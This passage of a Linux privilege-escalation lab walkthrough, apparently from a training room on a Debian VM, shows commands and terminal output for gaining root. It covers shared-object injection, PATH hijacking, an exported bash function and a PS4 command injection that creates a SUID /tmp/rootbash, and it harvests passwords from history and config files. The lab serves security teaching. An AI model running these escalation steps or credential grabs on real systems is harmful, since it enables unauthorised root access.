plain">open(&quot;/etc/ld.so.cache&quot;, O_RDONLY)      = 3</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">open(&quot;/lib/libdl.so.2&quot;, O_RDONLY)       = 3</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">open(&quot;/usr/lib/libstdc++.so.6&quot;, O_RDONLY) = 3</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">open(&quot;/lib/libm.so.6&quot;, O_RDONLY)        = 3</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">open(&quot;/lib/libgcc_s.so.1&quot;, O_RDONLY)    = 3</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">open(&quot;/lib/libc.so.6&quot;, O_RDONLY)        = 3</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">open(&quot;/home/user/.config/libcalc.so&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$ mkdir /home/user/.config</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$ gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$ /usr/local/bin/suid-so</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Calculating something, please wait...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">bash-4.1# whoami</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">bash-4.1#</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ol><li>Read and follow along with the above.</li></ol><p><code>No answer needed</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="suid--sgid-executables---environment-variables">SUID / SGID Executables - Environment Variables<a href="#suid--sgid-executables---environment-variables" class="hash-link" aria-label="Direct link to SUID / SGID Executables - Environment Variables" title="Direct link to SUID / SGID Executables - Environment Variables">​</a></h2><p>The <strong>/usr/local/bin/suid-env</strong> executable can be exploited due to it inheriting the user&#x27;s PATH environment variable and attempting to execute programs without specifying an absolute path.</p><p>First, execute the file and note that it seems to be trying to start the apache2 webserver:</p><p><code>/usr/local/bin/suid-env</code></p><p>Run strings on the file to look for strings of printable characters:</p><p><code>strings /usr/local/bin/suid-env</code></p><p>One line (&quot;service apache2 start&quot;) suggests that the service executable is being called to start the webserver, however the full path of the executable (/usr/sbin/service) is not being used.</p><p>Compile the code located at <strong>/home/user/tools/suid/service.c</strong> into an executable called <strong>service</strong>. This code simply spawns a Bash shell:</p><p><code>gcc -o service /home/user/tools/suid/service.c</code></p><p>Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the <strong>suid-env</strong> executable to gain a root shell:</p><p><code>PATH=.:$PATH /usr/local/bin/suid-env</code></p><p><strong>Remember to exit out of the root shell before continuing!</strong></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$ /usr/local/bin/suid-env</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[....] Starting web server: apache2httpd (pid 1479) already running</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">. ok</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$ strings /usr/local/bin/suid-env</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/lib64/ld-linux-x86-64.so.2</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">5q;Xq</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">__gmon_start__</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">libc.so.6</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">setresgid</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">setresuid</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">system</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">__libc_start_main</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">GLIBC_2.2.5</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">fff.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">fffff.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">l$ L</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">t$(L</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|$0H</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">service apache2 start</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$ gcc -o service /home/user/tools/suid/service.c</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$ PATH=.:$PATH /usr/local/bin/suid-env</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@debian:~# whoami</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@debian:~#</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ol><li>Read and follow along with the above.</li></ol><p><code>No answer needed</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="suid--sgid-executables---abusing-shell-features-1">SUID / SGID Executables - Abusing Shell Features (#1)<a href="#suid--sgid-executables---abusing-shell-features-1" class="hash-link" aria-label="Direct link to SUID / SGID Executables - Abusing Shell Features (#1)" title="Direct link to SUID / SGID Executables - Abusing Shell Features (#1)">​</a></h2><p>The <strong>/usr/local/bin/suid-env2</strong> executable is identical to <strong>/usr/local/bin/suid-env</strong> except that it uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 webserver.</p><p>Verify this with strings:</p><p><code>strings /usr/local/bin/suid-env2</code></p><p>In Bash versions &lt;4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.</p><p>Verify the version of Bash installed on the Debian VM is less than 4.2-048:</p><p><code>/bin/bash --version</code></p><p>Create a Bash function with the name &quot;/usr/sbin/service&quot; that executes a new Bash shell (using -p so permissions are preserved) and export the function:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">function /usr/sbin/service { /bin/bash -p; }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">export -f /usr/sbin/service</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Run the <strong>suid-env2</strong> executable to gain a root shell:</p><p><code>/usr/local/bin/suid-env2</code></p><p><strong>Remember to exit out of the root shell before continuing!</strong></p><ol><li>Read and follow along with the above.</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$ strings /usr/local/bin/suid-env2</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/lib64/ld-linux-x86-64.so.2</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">__gmon_start__</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">libc.so.6</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">setresgid</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">setresuid</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">system</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">__libc_start_main</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">GLIBC_2.2.5</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">fff.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">fffff.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">l$ L</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">t$(L</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|$0H</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/usr/sbin/service apache2 start</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$ /bin/bash --version</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Copyright (C) 2009 Free Software Foundation, Inc.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">This is free software; you are free to change and redistribute it.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">There is NO WARRANTY, to the extent permitted by law.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$ function /usr/sbin/service { /bin/bash -p; }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$ export -f /usr/sbin/service</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$ /usr/local/bin/suid-env2</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@debian:~# whoami</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@debian:~#</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>No answer needed</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="suid--sgid-executables---abusing-shell-features-2">SUID / SGID Executables - Abusing Shell Features (#2)<a href="#suid--sgid-executables---abusing-shell-features-2" class="hash-link" aria-label="Direct link to SUID / SGID Executables - Abusing Shell Features (#2)" title="Direct link to SUID / SGID Executables - Abusing Shell Features (#2)">​</a></h2><p>Note: This will not work on Bash versions 4.4 and above.</p><p>When in debugging mode, Bash uses the environment variable <strong>PS4</strong> to display an extra prompt for debugging statements.</p><p>Run the <strong>/usr/local/bin/suid-env2</strong> executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:</p><p><code>env -i SHELLOPTS=xtrace PS4=&#x27;$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)&#x27; /usr/local/bin/suid-env2</code></p><p>Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:</p><p><code>/tmp/rootbash -p</code></p><p><strong>Remember to remove the /tmp/rootbash executable and exit out of the elevated shell before continuing as you will create this file again later in the room!</strong></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">rm /tmp/rootbash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">exit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ol><li>Read and follow along with the above.</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$ env -i SHELLOPTS=xtrace PS4=&#x27;$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)&#x27; /usr/local/bin/suid-env2</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/usr/sbin/service apache2 start</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">basename /usr/sbin/service</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">VERSION=&#x27;service ver. 0.91-ubuntu1&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">basename /usr/sbin/service</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">USAGE=&#x27;Usage: service &lt; option &gt; | --status-all | [ service_name [ command | --full-restart ] ]&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SERVICE=</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ACTION=</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SERVICEDIR=/etc/init.d</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">OPTIONS=</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">&#x27;[&#x27; 2 -eq 0 &#x27;]&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">cd /</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">&#x27;[&#x27; 2 -gt 0 &#x27;]&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">case &quot;${1}&quot; in</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">&#x27;[&#x27; -z &#x27;&#x27; -a 2 -eq 1 -a apache2 = --status-all &#x27;]&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">&#x27;[&#x27; 2 -eq 2 -a start = --full-restart &#x27;]&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">&#x27;[&#x27; -z &#x27;&#x27; &#x27;]&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SERVICE=apache2</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">shift</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">&#x27;[&#x27; 1 -gt 0 &#x27;]&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">case &quot;${1}&quot; in</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">&#x27;[&#x27; -z apache2 -a 1 -eq 1 -a start = --status-all &#x27;]&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">&#x27;[&#x27; 1 -eq 2 -a &#x27;&#x27; = --full-restart &#x27;]&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">&#x27;[&#x27; -z apache2 &#x27;]&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">&#x27;[&#x27; -z &#x27;&#x27; &#x27;]&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ACTION=start</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">shift</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">&#x27;[&#x27; 0 -gt 0 &#x27;]&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">&#x27;[&#x27; -r /etc/init/apache2.conf &#x27;]&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">&#x27;[&#x27; -x /etc/init.d/apache2 &#x27;]&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">exec env -i LANG= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM=dumb /etc/init.d/apache2 start</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Starting web server: apache2httpd (pid 1479) already running</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$ /tmp/rootbash -p</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">rootbash-4.1# whoami</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">rootbash-4.1# rm /tmp/rootbash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">rootbash-4.1# exit</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">exit</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>No answer needed</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="passwords--keys---history-files">Passwords &amp; Keys - History Files<a href="#passwords--keys---history-files" class="hash-link" aria-label="Direct link to Passwords &amp; Keys - History Files" title="Direct link to Passwords &amp; Keys - History Files">​</a></h2><p>If a user accidentally types their password on the command line instead of into a password prompt, it may get recorded in a history file.</p><p>View the contents of all the hidden history files in the user&#x27;s home directory:</p><p><code>cat ~/.*history | less</code></p><p>Note that the user has tried to connect to a MySQL server at some point, using the &quot;root&quot; username and a password submitted via the command line. Note that there is no space between the -p option and the password!</p><p>Switch to the root user, using the password:</p><p><code>su root</code></p><p><strong>Remember to exit out of the root shell before continuing!</strong></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">cat ~/.*history | less</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ls -al</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">cat .bash_history</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ls -al</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">mysql -h somehost.local -uroot -ppassword123</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">exit</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">cd /tmp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">clear</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ifconfig</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">netstat -antp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">nano myvpn.ovpn</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ls</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">whoami</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">exit</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">whoami</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">exit</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">whoami</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">exit</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">whoami</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ol><li>What is the full mysql command the user executed?</li></ol><p><code>mysql -h somehost.local -uroot -ppassword123</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="passwords--keys---config-files">Passwords &amp; Keys - Config Files<a href="#passwords--keys---config-files" class="hash-link" aria-label="Direct link to Passwords &amp; Keys - Config Files" title="Direct link to Passwords &amp; Keys - Config Files">​</a></h2><p>Config files often contain passwords in plaintext or other reversible formats.</p><p>List the contents of the user&#x27;s home directory:</p><p><code>ls /home/user</code></p><p>Note the presence of a myvpn.ovpn config file. View the contents of the file:</p><p><code>cat /home/user/myvpn.ovpn</code></p><p>The file should contain a reference to another location where the root user&#x27;s credentials can be found. Switch to the root user, using the credentials:</p><p><code>su root</code></p><p><strong>Remember to exit out of the root shell before continuing!</strong></p><ol><li>What file did you find the root user&#x27;s credentials in?</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$ ls /home/user</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">]  myvpn.ovpn  service  tools</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$ cat /home/user/myvpn.ovpn</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">client</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">dev tun</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">proto udp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">remote 10.10.10.10 1194</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">resolv-retry infinite</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">nobind</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">persist-key</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">persist-tun</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ca ca.crt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">tls-client</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">remote-cert-tls server</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">auth-user-pass /etc/openvpn/auth.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">comp-lzo</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">verb 1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">reneg-sec 0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$ cat /etc/openvpn/auth.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">password123</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>/etc/openvpn/auth.txt</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="passwords--keys---ssh-keys">Passwords &amp; Keys - SSH Keys<a href="#passwords--keys---ssh-keys" class="hash-link" aria-label="Direct link to Passwords &amp; Keys - SSH Keys" title="Direct link to Passwords &amp; Keys - SSH Keys">​</a></h2><p>Sometimes users make backups of important files but fail to secure them with the correct permissions.</p><p>Look for hidden files &amp; directories in the system root:</p><p><code>ls -la /</code></p><p>Note that there appears to be a hidden directory called <strong>.ssh</strong>. View the contents of the directory:</p><p><code>ls -l /.ssh</code></p><p>Note that there is a world-readable file called <strong>root_key</strong>. Further inspection of this file should indicate it is a private SSH key. 